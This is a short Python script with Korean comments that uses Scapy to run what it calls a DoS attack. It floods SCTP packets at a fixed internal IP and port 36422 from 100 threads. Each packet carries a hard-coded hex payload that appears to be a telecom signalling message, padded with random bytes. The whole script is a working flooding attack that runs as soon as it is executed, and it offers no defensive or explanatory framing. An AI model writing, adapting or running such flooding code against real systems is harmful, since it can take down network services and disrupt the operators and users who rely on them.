import random
import threading
from scapy.all import *

# 송신 IP, 수신 IP, 대상 포트 설정
src_ip = "10.244.0.1"
dst_ip = "10.244.0.105"
src_port = 62104
dst_port = 36422

# 원래 페이로드 내용
payload_data = bytes.fromhex(
    "000540818c000007001d000500007b0006000500020001000f000100001b0002"
    "0000001c0001000019000f0e016725bb860002f89930b8c614e0001a00815281"
    "500600004003e7001d003055452e524e5449003855452e494d53493100385545"
    "2e494d534932002855452e524154004055452e4d5f544d5349006055452e4349"
    "504845525f414c47007855452e494e544547524954595f414c47005855452e45"
    "4d4d5f4341555345007855452e52454c454153455f54494d4552008855452e45"
    "535441424c4953485f434155534500186d73673100186d73673200186d736733"
    "00186d73673400186d73673500186d73673600186d73673700186d7367380018"
    "6d73673900206d7367313000206d7367313100206d7367313200206d73673133"
    "00206d7367313400206d7367313500206d7367313600206d7367313700206d73"
    "67313800206d7367313900206d736732300000001e0000000000000000000000"
    "0000000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000"
)

# 무작위 길이의 추가 페이로드 생성
random_length = random.randint(900, 1000)
random_payload = bytes(random.getrandbits(8) for _ in range(random_length))

# 최종 페이로드 구성
final_payload = payload_data + random_payload

# DoS 공격 함수
def dos_attack(dst_ip, dst_port, payload, count=1000, delay=0.0001):
    packet = IP(src=src_ip, dst=dst_ip) / SCTP(sport=src_port, dport=dst_port) / SCTPChunkData(data=payload)
    print(f"Sending {count} packets to {dst_ip}:{dst_port}")

    for _ in range(count):
        send(packet, verbose=0)
        # time.sleep(delay)  # 지연 조절 가능

# 멀티 스레드를 사용한 공격
def start_multithreaded_attack(num_threads=10, count_per_thread=1000):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=dos_attack, args=(dst_ip, dst_port, final_payload, count_per_thread))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# 실행
start_multithreaded_attack(num_threads=100, count_per_thread=100)
